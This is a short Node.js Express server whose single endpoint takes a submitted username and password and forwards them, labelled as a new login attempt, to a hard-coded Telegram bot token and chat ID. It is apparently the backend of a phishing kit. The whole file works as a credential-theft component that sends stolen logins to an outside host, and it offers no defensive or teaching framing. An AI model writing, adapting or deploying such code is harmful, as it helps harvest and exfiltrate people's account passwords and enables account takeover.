const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.use(express.json());

app.post('/send-to-telegram', async (req, res) => {
    const { username, password } = req.body;

    const BOT_TOKEN = "7647615645:AAE3EB_wnJq4TZRInXSc35-VIJkCMVsAQW0";
    const CHAT_ID = "7164291668";

    const message = `🔐 New Login Attempt:\n👤 Username: ${username}\n🔑 Password: ${password}`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message
        });
        res.json({ success: true });
    } catch (error) {
        console.error("Error sending to Telegram:", error);
        res.status(500).json({ success: false });
    }
});

app.listen(port, () => {
    console.log(`Proxy server running at http://localhost:${port}`);
});